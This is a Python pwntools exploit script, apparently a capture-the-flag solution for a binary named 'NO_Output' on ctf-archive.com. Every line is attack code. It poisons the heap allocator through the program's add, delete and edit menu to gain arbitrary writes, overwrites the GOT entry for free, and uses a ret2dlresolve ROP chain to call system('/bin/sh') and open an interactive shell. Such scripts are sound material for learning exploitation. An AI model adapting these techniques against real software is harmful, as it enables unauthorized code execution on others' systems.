from pwn import *

binary = "./NO_Output"

server = "ctf-archive.com"
port = 10015

context.binary = binary

if len(sys.argv) > 1 and sys.argv[1] == 'r':
	p = remote(server, port)
else:
	p = gdb.debug([binary], gdbscript = 'b *0x4015ab \n c')

if len(sys.argv) > 2 and sys.argv[2] == 'd':
	context.log_level = 'debug'

e = ELF(binary)
r = ROP(e)

e.checksec()

def add(idx, size, data):
	p.sendline("1")
	p.sendline(str(idx))
	p.sendline(str(size))
	p.sendline(data)

def delete(idx):
	p.sendline("3")
	p.sendline(str(idx))

def edit(idx, data):
	p.sendline("2")
	p.sendline(str(idx))
	p.sendline(data)

def write(addr, payload):
	size = len(payload)
	add(0, size, "A")
	add(1, size, "A")
	delete(0)
	delete(1)
	edit(1, addr)
	add(0, size, "A")
	add(0, size, payload)

init = e.symbols["init"]
free_got = e.got["free"]
ret = r.find_gadget(['ret'])[0]

ret2dl = Ret2dlresolvePayload(e, symbol="system", args=["/bin/sh"])
r.ret2dlresolve(ret2dl)

p.send('\n')

write(p64(ret2dl.data_addr), ret2dl.payload)

payload = p64(init) + p64(ret)
write(p64(free_got), payload)

delete(0)

payload = b"A"*0x28
payload += r.chain()
p.sendline(payload)

p.interactive()